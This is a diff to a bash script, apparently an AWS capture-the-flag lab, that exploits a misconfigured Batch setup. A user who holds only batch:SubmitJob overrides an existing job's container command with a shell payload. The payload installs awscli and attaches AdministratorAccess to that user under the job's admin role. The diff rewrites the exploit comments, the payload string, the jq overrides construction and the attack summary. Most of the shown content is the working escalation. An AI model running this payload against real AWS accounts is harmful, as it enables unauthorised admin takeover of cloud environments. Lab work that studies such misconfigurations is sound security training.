@@ -243,25 +243,31 @@ fi
 echo ""
 
 # [EXPLOIT] Step 6: Build ContainerOverrides and submit Batch job
-# The existing job definition has a jobRoleArn pointing to an admin role.
-# By overriding the container command at submit time, we can make the container
-# run any AWS CLI command as that admin role — without needing iam:PassRole or
-# batch:RegisterJobDefinition. We attach AdministratorAccess to the starting user.
+# The existing job definition runs python:3.11-slim, a generic data-processing
+# image with no custom ENTRYPOINT — so ContainerOverrides.Command fully replaces
+# what the container executes, running as arbitrary shell code with the job
+# role's credentials. The job definition's jobRoleArn points to an admin role.
+#
+# python:3.11-slim ships neither the aws CLI nor curl, so the payload is a shell
+# one-liner that pip-installs the aws CLI and then attaches AdministratorAccess
+# to the starting user — all without needing iam:PassRole or
+# batch:RegisterJobDefinition. The container inherits the admin role via the
+# job definition's jobRoleArn.
 echo -e "${YELLOW}Step 6: Building ContainerOverrides to override job command${NC}"
-echo "The existing job definition '${JD_NAME}' has a jobRoleArn with admin permissions."
-echo "We override the container command to attach AdministratorAccess to our starting user."
+echo "The existing job definition '${JD_NAME}' runs python:3.11-slim with a jobRoleArn that has admin permissions."
+echo "We override the container command with a shell one-liner that installs the aws CLI and attaches AdministratorAccess to our starting user."
 echo ""
+
+# Shell payload: python:3.11-slim has no aws CLI, so pip-install it, then run
+# the escalation as the container's (admin) job role.
+EXPLOIT_PAYLOAD="pip install --quiet awscli && aws iam attach-user-policy --user-name ${STARTING_USER_NAME} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
 
 OVERRIDES_FILE=$(mktemp /tmp/batch-002-overrides-XXXXXX.json)
 jq -n \
-    --arg username "$STARTING_USER_NAME" \
+    --arg payload "$EXPLOIT_PAYLOAD" \
     --arg region "$AWS_REGION" \
     '{
-        command: [
-            "iam", "attach-user-policy",
-            "--user-name", $username,
-            "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
-        ],
+        command: ["sh", "-c", $payload],
         environment: [{"name": "AWS_DEFAULT_REGION", "value": $region}]
     }' > "$OVERRIDES_FILE"
 
@@ -410,8 +416,8 @@ echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_NAME (batch:SubmitJob only)"
 echo "2. Identified existing job definition '$JD_NAME' with admin jobRoleArn"
-echo "3. Submitted a Batch job overriding the container command to run:"
-echo "   iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn AdministratorAccess"
+echo "3. Submitted a Batch job overriding the python:3.11-slim container command with a shell one-liner:"
+echo "   sh -c 'pip install --quiet awscli && aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn AdministratorAccess'"
 echo "4. Container executed as the admin role (inherited from job definition)"
 echo "5. AdministratorAccess attached to starting user by the container"
 echo "6. Read CTF flag from SSM Parameter Store as the now-admin starting user"
